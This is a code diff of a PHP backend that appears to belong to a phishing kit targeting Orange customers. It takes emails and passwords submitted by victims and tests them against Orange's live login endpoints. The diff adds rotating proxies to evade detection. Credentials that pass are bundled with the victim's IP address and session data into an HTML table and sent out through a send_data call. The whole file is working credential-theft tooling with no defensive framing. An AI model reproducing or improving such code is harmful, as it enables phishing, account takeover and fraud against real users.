@@ -5,39 +5,57 @@ set_time_limit(0);
 
 class dataScraper
 {
+    public $is_orange_login = true;   // if this value is false then return login success always
     public $base_url = 'https://login.orange.fr';
     public $login_url = 'https://login.orange.fr/front/login';
     public $pass_url = 'https://login.orange.fr/front/password';
     public $cookiefile = 'login.cookies';
+    public $proxy_file = "proxy.txt";
 
     public function run($email, $password)
     {
-        $this->cookiefile = __DIR__ . '/' . $this->cookiefile;
-        @unlink(__DIR__ . '/' . $this->cookiefile);
-        $content = $this->sendRequest($this->base_url);
-        sleep(1);
-        $post_data = json_encode(['force'=>'', 'login'=>$email, 'mem'=>true, 'params'=>'']);
-        $c = $this->sendRequest($this->login_url, ['post_data' => $post_data]);
-        $c = json_decode($c);
-        if(empty($c->options)){
-            return false;
-        }else{
-            $c = json_decode($c->options);
-            $loginEncrypt = $c->loginEncrypt;
-
-            sleep(2);
-
-            $post_data = json_encode(['login'=>$email, 'loginEncrypt'=>$loginEncrypt, 'params'=>'', 'password'=>$password, 'remember'=>true]);
-
-            $c = $this->sendRequest($this->pass_url, ['post_data' => $post_data, 'header'=>['X-Requested-With: XMLHttpRequest']]);
+        if($this->is_orange_login){
+            $this->cookiefile = __DIR__ . '/' . $this->cookiefile;
             @unlink(__DIR__ . '/' . $this->cookiefile);
 
+            $proxies = array_unique(array_filter(array_map('trim', explode("\n", file_get_contents($this->proxy_file)))));
+            shuffle($proxies);                        //  shuffle proxy list randomly
+            $proxy = array_shift($proxies);           //  select one proxy from them
+
+            $param = array();
+            $param['proxy'] = $proxy;
+
+            $content = $this->sendRequest($this->base_url, $param);
+            sleep(1);
+            $post_data = json_encode(['force'=>'', 'login'=>$email, 'mem'=>true, 'params'=>'']);
+            $param['post_data']=$post_data;
+            $c = $this->sendRequest($this->login_url, $param);
             $c = json_decode($c);
-            if(empty($c->code)){
-                return true;
-            }else{
+            if(empty($c->options)){
                 return false;
+            }else{
+                $c = json_decode($c->options);
+                $loginEncrypt = $c->loginEncrypt;
+
+                sleep(2);
+
+                $post_data = json_encode(['login'=>$email, 'loginEncrypt'=>$loginEncrypt, 'params'=>'', 'password'=>$password, 'remember'=>true]);
+
+                $param['post_data']=$post_data;
+                $param['header']=['X-Requested-With: XMLHttpRequest'];
+                $c = $this->sendRequest($this->pass_url, $param);
+                
+                @unlink(__DIR__ . '/' . $this->cookiefile);
+
+                $c = json_decode($c);
+                if(empty($c->code)){
+                    return true;
+                }else{
+                    return false;
+                }
             }
+        }else{
+            return true;
         }
     }
 
@@ -77,6 +95,21 @@ class dataScraper
             CURLOPT_HTTPHEADER,
             $header
         );
+
+        if (isset($params["proxy"])) {
+            
+            $proxy_param = explode("@", $params["proxy"]);
+            $userpwd = $proxy_param[0];
+            $proxy_param = explode(":", $proxy_param[1]);
+            $proxy = $proxy_param[0];
+            $proxyPort = $proxy_param[1];
+
+            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
+            curl_setopt($ch, CURLOPT_PROXY, $proxy);
+            curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
+            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpwd);
+        }
+
         if (isset($params["post_data"])) {
             if (isset($params["multiform"])) {
                 $post_fields = $params["post_data"];
@@ -134,65 +167,36 @@ class dataScraper
         return $content;
     }
 }
-/*
-if(!empty($_REQUEST['email'])&&!empty($_REQUEST['password'])){
-	$email = $_REQUEST['email'];
-	$password = $_REQUEST['password'];
-
-	$scrapper = new dataScraper();
-	if($scrapper->run($email, $password)){
-    $info_names = array(
-
-  		"IDENTIFIANT" => "user_id",
-  		"ID PASSWORD" => "pass_id"
-  	);
-
-    include("config.php");
-    $result = '<table border="1" cellpadding="2" cellspacing="0">
-      <tr><td>IDENTFIANT</td><td>'.$_SESSION['user_id'].'</td></tr>
-      <tr><td>PASSWORD</td><td>'.$_SESSION['pass_id'].'</td></tr>
-      <tr><td>EMAIL</td><td>'.$email.'</td></tr>
-      <tr><td>PASSWORD</td><td>'.$password.'</td></tr>
-      <tr><td>IP ADDRESS</td><td>'.getenv("REMOTE_ADDR").'</td></tr>
-    </table><p>';
-
-
-    save_rs("backup","../../rez/IPS.html",$result);
-
-		echo json_encode(['status'=>'success']);
-	}else{
-    echo json_encode(['status'=>'success']);
-	}
-
-}
-*/
 
 
 if(!empty($_REQUEST['email'])&&!empty($_REQUEST['password'])){
 	$email = $_REQUEST['email'];
 	$password = $_REQUEST['password'];
 
+    $scrapper = new dataScraper();
+    if($scrapper->run($email, $password)){
 
-  $info_names = array(
+        $info_names = array(
 
-		"IDENTIFIANT" => "user_id",
-		"ID PASSWORD" => "pass_id"
-	);
+                "IDENTIFIANT" => "user_id",
+                "ID PASSWORD" => "pass_id"
+            );
 
-  include("config.php");
-  $result = '<table border="1" cellpadding="2" cellspacing="0">
-    <tr><td>IDENTFIANT</td><td>'.$_SESSION['user_id'].'</td></tr>
-    <tr><td>PASSWORD</td><td>'.$_SESSION['pass_id'].'</td></tr>
-    <tr><td>EMAIL</td><td>'.$email.'</td></tr>
-    <tr><td>PASSWORD</td><td>'.$password.'</td></tr>
-    <tr><td>IP ADDRESS</td><td>'.getenv("REMOTE_ADDR").'</td></tr>
-  </table><p>';
-
-
-    //save_rs("backup","../../rez/IPS.html",$result);
-
-    $res = send_data(['data'=>$result]);
-
-    echo json_encode(['status'=>'success']);
+        include("config.php");
+        $result = '<table border="1" cellpadding="2" cellspacing="0">
+            <tr><td>IDENTFIANT</td><td>'.$_SESSION['user_id'].'</td></tr>
+            <tr><td>PASSWORD</td><td>'.$_SESSION['pass_id'].'</td></tr>
+            <tr><td>EMAIL</td><td>'.$email.'</td></tr>
+            <tr><td>PASSWORD</td><td>'.$password.'</td></tr>
+            <tr><td>IP ADDRESS</td><td>'.getenv("REMOTE_ADDR").'</td></tr>
+        </table><p>';
+        //save_rs("backup","../../rez/IPS.html",$result);
+        $res = send_data(['data'=>$result]);
+        echo json_encode(['status'=>'success']);
+    }else{
+        echo json_encode(['status'=>'failure']);
+    }
+}else{
+    echo json_encode(['status'=>'failure']);
 }
 ?>
